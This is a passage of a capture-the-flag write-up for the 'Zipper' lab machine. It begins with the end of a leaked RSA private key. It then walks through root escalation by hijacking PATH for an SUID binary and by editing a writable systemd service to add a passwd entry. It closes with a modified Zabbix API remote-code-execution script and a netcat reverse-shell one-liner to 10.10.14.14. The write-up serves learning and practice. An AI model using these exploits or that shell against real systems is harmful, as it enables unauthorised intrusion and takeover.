8MyoGxzgSRrTFtYodXtXY5FTY3UrnRXLr+Q3TZYDAoGBALU/NO5/3mP/RMymYGac
OtYx1DfFdTkyY3y9B98OcAKkIlaA0rPh8O+gOnkMuPXSia5mOH79ieSigxSfRDur
7hZVeJY0EGOJPSRNY5obTzgCn65UXvFxOQCYtTWAXgLlf39Cw0VswVgiPTa4967A
m9F2Q8w+ZY3b48LHKLcHHfx7AoGATOqTxRAYSJBjna2GTA5fGkGtYFbevofr2U8K
Oqp324emk5Keu7gtfBxBypMD19ZRcVdu2ZPOkxRkfI77IzUE3yh24vj30BqrAtPB
MHdR24daiU8D2/zGjdJ3nnU19fSvYQ1v5ObrIDhm9XNFRk6qOlUp+6lW7fsnMHBu
lHBG9NkCgYEAhqEr2L1YpAW3ol8uz1tEgPdhAjsN4rY2xPAuSXGXXIRS6PCY8zDk
WaPGjnJjg9NfK2zYJqI2FN+8Yyfe62G87XcY7ph8kpe0d6HdVcMFE4IJ8iKCemNE
Yh/DOMIBUavqTcX/RVve0rEkS8pErQqYgHLHqcsRUGJlJ6FSyUPwjnQ=
-----END RSA PRIVATE KEY-----

```

## Privesc: zapper –> root

There’s two independent paths to get to root.

### Path 1 - zabbix-service SUID Binary

There’s a root-owned setuid binary also in zapper’s homedir:

```

zapper@zipper:~/utils$ ls -l
total 12
-rwxr-xr-x 1 zapper zapper  195 Oct 30 20:55 backup.sh
-rwsr-sr-x 1 root   root   7556 Sep  8 13:05 zabbix-service

zapper@zipper:~/utils$ file zabbix-service 
zabbix-service: setuid, setgid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=70745588e3c50ad90b7074ea8f9bf16f5a12e004, not stripped

```

If I run it, it asks about starting or stopping the zabbix service:

```

zapper@zipper:~/utils$ ./zabbix-service 
start or stop?: start

```

If I run it with `ltrace`, I can see the library calls being made:

```

zapper@zipper:~/utils$ ltrace ./zabbix-service 
__libc_start_main(0x4ec6ed, 1, 0xbfcee854, 0x4ec840 <unfinished ...>
setuid(0)= -1
setgid(0)= -1
printf("start or stop?: ")= 16
fgets(start or stop?: start
"start\n", 10, 0xb7f795c0)= 0xbfcee782
strcspn("start\n", "\n")= 5
strcmp("start", "start")= 0
system("systemctl daemon-reload && syste"...Failed to reload daemon: The name org.freedesktop.PolicyKit1 was not provided by any .service files
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )= 256
+++ exited (status 0) +++

```

Of interest, there’s a call towards the end: `system("systemctl daemon-reload && syste`. It’s a bit cut off, but I can see it better in `strings`:

```

zapper@zipper:~/utils$  strings zabbix-service | grep system
system
systemctl daemon-reload && systemctl start zabbix-agent
systemctl stop zabbix-agent
system@@GLIBC_2.0

```

That’s calling `system` on `systemctl` without a path. If I change the path and call again, I can replace systemctl with my own thing to run.

Save the old path, and then set the path to `/dev/shm`:

```

zapper@zipper:~/utils$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
zapper@zipper:~/utils$ export OLD=$PATH
zapper@zipper:~/utils$ export PATH=/dev/shm

```

Now if I run `zabbix-service`, it fails:

```

zapper@zipper:~/utils$ ./zabbix-service 
start or stop?: start
sh: 1: systemctl: not found

```

Now drop a sh script to run a shell:

```

zapper@zipper:~/utils$ /bin/cat /dev/shm/systemctl 
#!/bin/sh

/bin/sh

```

And run again:

```

zapper@zipper:~/utils$ ./zabbix-service 
start or stop?: start
# id
/bin/sh: 1: id: not found
# echo $OLD
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
# export PATH=$OLD
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(zapper)

```

Now can grab root flag:

```

root@zipper:/root# cat root.txt 
a7c743d3...

```

Interestingly, this can be done directly from the Zabbix account, in case I wanted to skip user and go right to root:

```

zabbix@zipper:/home/zapper/utils$ echo -e '#!/bin/sh\n\n/bin/sh' > /dev/shm/systemctl 
zabbix@zipper:/home/zapper/utils$ chmod +x /dev/shm/systemctl                         
zabbix@zipper:/home/zapper/utils$ export OLD=$PATH                                    
zabbix@zipper:/home/zapper/utils$ export PATH=/dev/shm                                
zabbix@zipper:/home/zapper/utils$ ./zabbix-service                                    
start or stop?: start
# export PATH=$OLD
# id
uid=0(root) gid=0(root) groups=0(root),113(zabbix)

```

### Path 2 - purge-backups.sh

#### Enumeration

`journalctl` is a program that will query the contents of the `systemd` (a service manager for Linux) journal. If I run it with the `-f` flag, it will wait and display new entries as they are created. For example, if I start `journalctl -f` and then run `./zabbix-service stop`, I see the service stop:

```

Feb 21 05:59:12 zipper systemd[1]: Stopping Zabbix Agent...
Feb 21 05:59:12 zipper systemd[1]: Stopped Zabbix Agent.

```

Starting makes a log as well:

```

Feb 21 06:00:30 zipper systemd[1]: Reloading.
Feb 21 06:00:30 zipper systemd[1]: Started Zabbix Agent.
Feb 21 06:00:30 zipper zabbix_agentd[20068]: Starting Zabbix Agent [Zipper]. Zabbix 3.0.12 (revision 73586).
Feb 21 06:00:30 zipper zabbix_agentd[20068]: Press Ctrl+C to exit.

```

If I just let it run for a while, I’ll see another service:

```

zapper@zipper:/etc/systemd/system$ journalctl -f
-- Logs begin at Sat 2018-09-08 02:45:49 EDT. --Feb 21 06:07:14 zipper systemd[1]: Started Purge Backups (Script).
Feb 21 06:07:14 zipper systemd[1]: Started Purge Backups (Script).
Feb 21 06:07:14 zipper purge-backups.sh[5884]: [>] Backups purged successfully
Feb 21 06:12:14 zipper systemd[1]: Started Purge Backups (Script).
Feb 21 06:12:14 zipper purge-backups.sh[5898]: [>] Backups purged successfully

```

#### purge-backups

Services are defined in `/etc/systemd/system/`. Most of the standard system stuff is actually a symbolic link to paths in `/lib/systemd/system`. But I can look for the user created stuff actually in `/etc/systemd/system` by using `find` with the `-type f` to get files, and not links:

```

zapper@zipper:/$ find /etc/systemd/system/ -type f -name *.service -ls
   268692      4 -rw-rw-r--   1 root     zapper        132 Sep  8 13:22 /etc/systemd/system/purge-backups.service
   268691      4 -rw-r--r--   1 root     root          147 Sep  8 13:03 /etc/systemd/system/start-docker.service

```

Not only is there a service named purge-backups.server, but it is writable by zapper.

If I look at the file, I’ll see how the service is defined:

```

zapper@zipper:/etc/systemd/system$ cat purge-backups.service
[Unit]
Description=Purge Backups (Script)
[Service]
ExecStart=/root/scripts/purge-backups.sh
[Install]
WantedBy=purge-backups.timer

```

I can see that the service runs a script in the `/root` directory. It also has this parameter `WantedBy` that points to a file, `purge-backups.timer`. `WantedBy` is the most common directive to specify how the service is enabled. Digital Ocean has a [great primer on systemd units and unit files](https://www.digitalocean.com/community/tutorials/understanding-systemd-units-and-unit-files).

I’ll take a look at the timer file:

```

zapper@zipper:/etc/systemd/system$ cat purge-backups.timer 
[Unit]
Description=Purge Backups (Timer)
After=zabbix-agent.service
Requires=zabbix-agent.service
BindsTo=zabbix-agent.service

[Timer]
OnBootSec=15s
OnUnitActiveSec=5m
Unit=purge-backups.service

[Install]
WantedBy=zabbix-agent.service

```

In the first section, `After`, `Requires`, and `BindsTo` say that this service will only run after `zabbix-agent.server`, and only while it is running. I can see this if I run `/home/zapper/utils/zabbix-service stop`, I stop seeing the purge script in `journalctl` as well.

In the second section, it defines that the service will start 15 seconds after boot, and while active every 5 minutes.

#### Exploit

The flaw here is that while the service runs as root, both of these files that define the service are writable by zapper:

```

zapper@zipper:/etc/systemd/system$ ls -l purge-backups.*
-rw-rw-r-- 1 root zapper 132 Sep  8 13:22 purge-backups.service
-rw-rw-r-- 1 root zapper 237 Feb 21 09:15 purge-backups.timer

```

There are tons of ways to get to root from here. I’ll add a root user to /etc/passwd.

First, I’ll create a script that does that:

```

zapper@zipper:/dev/shm$ openssl passwd 0xdf
ydmNDQhnaXn92

zapper@zipper:/dev/shm$ echo -e '#!/bin/sh\n\necho "df:ydmNDQhnaXn92:0:0:root:/root:/bin/bash" >> /etc/passwd'
#!/bin/sh

echo "df:ydmNDQhnaXn92:0:0:root:/root:/bin/bash" >> /etc/passwd

zapper@zipper:/dev/shm$ echo -e '#!/bin/sh\n\necho "df:ydmNDQhnaXn92:0:0:root:/root:/bin/bash" >> /etc/passwd' > .a.sh

```

Now I’ll make a copy of the original into `/tmp`, and then update `purge-backups.service`:

```

zapper@zipper:/dev/shm$ cp /etc/systemd/system/purge-backups.service /tmp/

zapper@zipper:/dev/shm$ vi /etc/systemd/system/purge-backups.service

zapper@zipper:/dev/shm$ cat /etc/systemd/system/purge-backups.service
[Unit]
Description=Purge Backups (Script)
[Service]
ExecStart=/dev/shm/.a.sh
[Install]
WantedBy=purge-backups.timer

```

Now I can wait 5 minutes, or just stop and start the zabbix-agent service:

```

zapper@zipper:/dev/shm$ /home/zapper/utils/zabbix-service stop
zapper@zipper:/dev/shm$ /home/zapper/utils/zabbix-service start

```

Now just `su` into my new root user:

```

zapper@zipper:/dev/shm$ su df
Password: 
root@zipper:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)

```

Now as root, I can clean up by removing the last line in `/etc/passwd`, as well as the script in `/dev/shm`. I’ll also change the service back to how it originally was:

```

root@zipper:/tmp# cat purge-backups.service > /etc/systemd/system/purge-backups.service

```

And get the flag:

```

root@zipper:~# cat root.txt 
a7c743d3...

```

## Beyond root - Exploit-Db Shell

### Background

A lot of people doing this challenge, including me at first, found the “exploit” on Exploit-DB and eventually got it working, only to be confused as to why there was nothing of interest in the container (well, besides the admin cred reuse and the ability to send commands to the other agent). Now that we understand how the API works, I can take a look at how this shell works, and why it gives the results that it does.

I was tempted to make my own shell, but given that this one mostly works once you understand what it’s doing, I decided to just make a slight modification to this one.

### Getting the Shell Running

On downloading, I’ll have to change a few parameters:

```

ZABIX_ROOT = 'http://10.10.10.108/zabbix'	### Zabbix IP-address
url = ZABIX_ROOT + '/api_jsonrpc.php'	### Don't edit

login = 'zapper'		### Zabbix login
password = 'zapper'	### Zabbix password
hostid = '10106'	### Zabbix hostid

```

The path, username, and password I already had at this point. I showed I could use the API to get the hostid, but I could also find that in the GUI as guest. In the Monitoring/Latest Data view, once filtered to see the hosts, if I click on Zipper and run a script, I can see the hostid in the url of the window the pops up:

![](https://0xdfimages.gitlab.io/img/zipper-gui-hostid.gif)

Now I can run the shell, and get code execution in the Zabbix container.

```

root@kali# python 39937.py 
[zabbix_cmd]>>:  hostname
91cae047f48a

```

### Shell Details

So what is the shell doing? I’ll walk it section by section.

The first block of code after defining the variables looks like this:

```

### auth
payload = {
        "jsonrpc" : "2.0",
    "method" : "user.login",
    "params": {
        'user': ""+login+"",
        'password': ""+password+"",
    },
        "auth" : None,
    "id" : 0,
}
headers = {
    'content-type': 'application/json',
}

auth  = requests.post(url, data=json.dumps(payload), headers=(headers))
auth = auth.json()

```

This is just issuing the user.logon API call, just as I did above, to login. It’s grabbing the resulting json and storing it as `auth`.

Next, there’s a `while True:` loop. I’ll look at the loop in three parts. First, this block:

```

        cmd = raw_input('\033[41m[zabbix_cmd]>>: \033[0m ')
        if cmd == "" : print "Result of last command:"
        if cmd == "quit" : break

```

This just prints the prompt, reads the result into `cmd`. If `cmd` is empty, it prints “Result of last command:”. If cmd is “quit”, it exits.

Next it uses the script.update API to update scriptid 1 with the new command it read in:

```

### update
        payload = {
                "jsonrpc": "2.0",
                "method": "script.update",
                "params": {
                    "scriptid": "1",
                    "command": ""+cmd+""
                },
                "auth" : auth['result'],
                "id" : 0,
        }

        cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers))

```

So what happens if cmd is the empty string? I can use `curl` to check:

```

root@kali# curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0","method":"script.update","id":1,"auth":"e53de718bf70398f6e26c8cafbc246c6","params
":{"scriptid":"1", "command":""}}' | jq .
{
  "jsonrpc": "2.0",
  "error": {
    "code": -32602,
    "message": "Invalid params.",
    "data": "Script command cannot be empty."
  },
  "id": 1
}

```

So the script remains unchanged. That’s why the message prints saying that it will run the last command.

Finally, there’s an API call to run the script using script.execute:

```

### execute
        payload = {
                "jsonrpc": "2.0",
                "method": "script.execute",
                "params": {
                    "scriptid": "1",
                    "hostid": ""+hostid+""
                },
                "auth" : auth['result'],
                "id" : 0,
        }

        cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers))
        cmd_exe = cmd_exe.json()
        print cmd_exe["result"]["value"]

```

### Why Zabbix and Not Zipper

So that leads to the question - why did this run on Zabbix? I gave it the hostid for Zipper. It has to do with the `execute_on` parameter, which this script makes no changes to.

As the script updates scriptid 1, I’ll look at those details (using `jq` to select just that script):

```

root@kali# curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.get", "id":1, "auth":"e53de718bf70398f6e26c8cafbc246c6", "params":{}}' | jq '.result | .[] | select(.scriptid == "1")'
{
  "scriptid": "1",
  "name": "Ping",
  "command": "hostname",
  "host_access": "2",
  "usrgrpid": "0",
  "groupid": "0",
  "description": "",
  "confirmation": "",
  "type": "0",
  "execute_on": "1"
}

```

So on a clean reset, the `execute_on` parameter is 1. Looking in the [documentation on the script object](https://www.zabbix.com/documentation/3.0/manual/api/reference/script/object), I’ll see that means to run the command on the Zabbix server, not the agent:

![1550696824535](https://0xdfimages.gitlab.io/img/1550696824535.png)

I can see this more easily in the GUI. I’ll log in as admin, and visit `http://10.10.10.108/zabbix/zabbix.php?action=script.edit&scriptid=1`:

![1550696919679](https://0xdfimages.gitlab.io/img/1550696919679.png)

So since the script doesn’t change it, this script will run on the server and not the agent.

### Update to Run on Zipper

So I have a couple options I can change to get RCE on Zipper. While I’m logged in as Admin, I can just set scriptid 1 to run on agent in the GUI. I could also just add `execute_on` to the update payload in the script:

```

### update
        payload = {
                "jsonrpc": "2.0",
                "method": "script.update",
                "params": {
                    "scriptid": "1",
                    "command": ""+cmd+"",
                    "execute_on": "0"
                },
                "auth" : auth['result'],
                "id" : 0,
        }

```

Now I can run with a shell on Zipper:

```

root@kali# python 39937.py 
[zabbix_cmd]>>:  id
uid=107(zabbix) gid=113(zabbix) groups=113(zabbix)
[zabbix_cmd]>>:  hostname
zipper

```

### Still Run on Zabbix

The next logical step would be to change the host id to 10105 and run commands on Zabbix. That should work, but it doesn’t:

```

root@kali# python 39937.py 
[zabbix_cmd]>>:  hostname
Traceback (most recent call last):
  File "39937.py", line 76, in <module>
    print cmd_exe["result"]["value"]
KeyError: 'result'

```

Why? I’ll switch `execute_on` back to “1” and check out Zabbix again.

When I tell Zabbix to execute on the Zabbix agent, it contacts the agent listening on port 10050 with the command. But it looks like the Zabbix host doesn’t have anything listening on 10050:

```

[zabbix_cmd]>>:  netstat -plnt
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:10051           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::10051                :::*                    LISTEN      -

```

If I look at running processes on Zipper, I see these `/usr/sbin/zabbix_agentd` processes:

```

zabbix     676  0.0  0.5  17152  5452 ?        Ss   15:00   0:00 /usr/sbin/zabbix_agentd --foreground
zabbix     733  0.0  0.2  17152  2576 ?        S    15:00   0:00 /usr/sbin/zabbix_agentd: collector [idle 1 sec]
zabbix     734  0.0  0.0  17152   684 ?        S    15:00   0:00 /usr/sbin/zabbix_agentd: listener #1 [waiting for connection]
zabbix     735  0.0  0.3  17152  3564 ?        S    15:00   0:00 /usr/sbin/zabbix_agentd: listener #2 [waiting for connection]
zabbix     736  0.0  0.3  17152  3540 ?        S    15:00   0:00 /usr/sbin/zabbix_agentd: listener #3 [processing request]
zabbix     737  0.0  0.2  17152  2928 ?        S    15:00   0:00 /usr/sbin/zabbix_agentd: active checks #1 [idle 1 sec]

```

But in the container, I only see `/usr/sbin/zabbix_server`.

So if the agent isn’t running, than there’s no mechanism for the server to reach out to the agent (even though they are the same host) and run something.

### How I Updated the Script

I want my shell to be able to run commands on either Zabbix or Zipper. And I now understand that that is set by the `execute_on` setting.

Just after the variables like `login`, `password`, and `hostid` were set, I’ll add this:

```

 23 hosts = ['zipper', 'zabbix']
 24 
 25 def set_host(host):
 26 
 27     global execute_on
 28 
 29     if host.lower() == 'zipper':
 30         execute_on = 0
 31     elif host.lower() == 'zabbix':
 32         execute_on = 1
 33     print("[*] Current host is " + hosts[execute_on] + "\n")
 34 
 35 set_host('zabbix')

```

It simply takes a host string, and if that string matches ‘zipper’ or ‘zabbix’ (case insensitive), it sets the `execute_on` variable to 0 or 1, and prints the current host.

Next, in the while loop, just after the command is read and checked for empty or quit, I’ll add one more if:

```

 60         if cmd.lower().startswith('host '):
 61             set_host(cmd.split(' ')[1])
 62             continue

```

If the command starts with “host “ (case insensitive), I’ll split on space and set the host to the second word. If that word matches ‘zipper’ or ‘zabbix’, it updates `execute_on`. And then I run continue to not send a request, but rather go back to the prompt for command.

Now, in the json for the payload for the script.update API, I’ll add the execute\_on parameter:

```

 64 ### update
 65         payload = {
 66                 "jsonrpc": "2.0",
 67                 "method": "script.update",
 68                 "params": {
 69                     "scriptid": "1",
 70                     "command": ""+cmd+"",
 71                     "execute_on": str(execute_on)
 72                 },
 73                 "auth" : auth['result'],
 74                 "id" : 0,
 75         }

```

Finally one cosmetic change. I’ll update the prompt to show the current host:

```

 57         cmd = raw_input('\033[41m[' + hosts[execute_on]  + '_cmd]>>: \033[0m ')

```

Now I can run this shell, and change which host I’m interacting with:

```

root@kali# python zipper_shell.py
[*] Current host is zabbix

[zabbix_cmd]>>:  hostname
91cae047f48a

[zabbix_cmd]>>:  host zipper
[*] Current host is zipper

[zipper_cmd]>>:  hostname
zipper
[zipper_cmd]>>:  host zabbix
[*] Current host is zabbix

[zabbix_cmd]>>:  hostname
91cae047f48a

[zabbix_cmd]>>:  host 0xdf # invalid host option leaves host the same
[*] Current host is zabbix

```

I did make one other change to the shell. I noticed when I gave it a reverse shell, it would eventually timeout, and crash the shell:

```

[zipper_cmd]>>:  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 443>/tmp/f
Traceback (most recent call last):
  File "zipper_shell.py", line 93, in <module>
    print cmd_exe["result"]["value"]
KeyError: 'result'

```

I can fix this by adding a `try`:

```

 93         try:
 94             print cmd_exe["result"]["value"]
 95         except KeyError:
 96             print("[-] Unexpected data: ")
 97             print(cmd_exe)

```

Now I can continue after a command like a shell:

```

[zipper_cmd]>>:  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 443>/tmp/f
[-] Unexpected data:
{u'jsonrpc': u'2.0', u'id': 0, u'error': {u'message': u'Application error.', u'code': -32500, u'data': u'Timeout while executing a shell script.'}}                                                                        
[zipper_cmd]>>:  id
uid=107(zabbix) gid=113(zabbix) groups=113(zabbix)

```

I could go beyond this as well. For example, I could create a command `shell` much like I did with `host` that automatically runs the reverse shell to get a callback. I could have it take an ip and port. I’ll leave that as an exercise for the reader.

### Conclusion

At first I thought it was sloppy on the shell’s author to not include the `execute_on` parameter. But I suspect in their eyes the Zabbix server was a juicier target. So if they had included it, they would have defaulted to running on the server anyway.

It will say it was nicely done on Zipper’s author’s part to have it set to default running on the wrong host, as it makes us as players have to figure out what’s going on and not just use the scripts on the internet.

### Code

Here’s my final script:

```

  1 #!/usr/bin/env python
  2 # -*- coding: utf-8 -*-
  3 
  4 # Exploit Title: Zabbix RCE with API JSON-RPC
  5 # Date: 06-06-2016
  6 # Exploit Author: Alexander Gurin
  7 # Vendor Homepage: http://www.zabbix.com
  8 # Software Link: http://www.zabbix.com/download.php
  9 # Version: 2.2 - 3.0.3
 10 # Tested on: Linux (Debian, CentOS)
 11 # CVE : N/A
 12 
 13 import requests
 14 import json
 15 import readline
 16 
 17 ZABIX_ROOT = 'http://10.10.10.108/zabbix'       ### Zabbix IP-address
 18 url = ZABIX_ROOT + '/api_jsonrpc.php'   ### Don't edit
 19 
 20 login = 'zapper'                ### Zabbix login
 21 password = 'zapper'     ### Zabbix password
 22 hostid = '10106'        ### Zabbix hostid
 23 hosts = ['zipper', 'zabbix']
 24 
 25 def set_host(host):
 26 
 27     global execute_on
 28 
 29     if host.lower() == 'zipper':
 30         execute_on = 0
 31     elif host.lower() == 'zabbix':
 32         execute_on = 1
 33     print("[*] Current host is " + hosts[execute_on] + '\n')
 34 
 35 set_host('zabbix')
 36 
 37 
 38 ### auth
 39 payload = {
 40         "jsonrpc" : "2.0",
 41     "method" : "user.login",
 42     "params": {
 43         'user': ""+login+"",
 44         'password': ""+password+"",
 45     },
 46         "auth" : None,
 47     "id" : 0,
 48 }
 49 headers = {
 50     'content-type': 'application/json',
 51 }
 52 
 53 auth  = requests.post(url, data=json.dumps(payload), headers=(headers))
 54 auth = auth.json()
 55 
 56 while True:
 57         cmd = raw_input('\033[41m[' + hosts[execute_on]  + '_cmd]>>: \033[0m ')
 58         if cmd == "" : print "Result of last command:"
 59         if cmd == "quit" : break
 60         if cmd.lower().startswith('host ') and len(cmd.split(' ')) > 1:
 61             set_host(cmd.split(' ')[1])
 62             continue
 63 
 64 ### update
 65         payload = {
 66                 "jsonrpc": "2.0",
 67                 "method": "script.update",
 68                 "params": {
 69                     "scriptid": "1",
 70                     "command": ""+cmd+"",
 71                     "execute_on": str(execute_on)
 72                 },
 73                 "auth" : auth['result'],
 74                 "id" : 0,
 75         }
 76 
 77         cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers))
 78 
 79 ### execute
 80         payload = {
 81                 "jsonrpc": "2.0",
 82                 "method": "script.execute",
 83                 "params": {
 84                     "scriptid": "1",
 85                     "hostid": ""+hostid+""
 86                 },
 87                 "auth" : auth['result'],
 88                 "id" : 0,
 89         }
 90 
 91         cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers))
 92         cmd_exe = cmd_exe.json()
 93         try:
 94             print cmd_exe["result"]["value"]
 95         except KeyError:
 96             print("[-] Unexpected data: ")
 97             print(cmd_exe)

```